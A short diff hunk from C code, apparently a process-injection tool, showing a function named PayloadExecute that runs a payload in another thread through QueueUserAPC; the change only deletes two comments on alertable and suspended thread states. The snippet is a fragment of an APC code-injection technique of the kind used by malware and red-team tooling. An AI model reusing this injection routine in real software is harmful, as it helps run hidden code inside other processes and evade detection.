@@ -27,8 +27,6 @@ BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess, IN HANDLE hThread, IN PBYTE pP
 		return FALSE;
 	}
 
-	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
-	// If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
 	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
 		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
 		return FALSE;
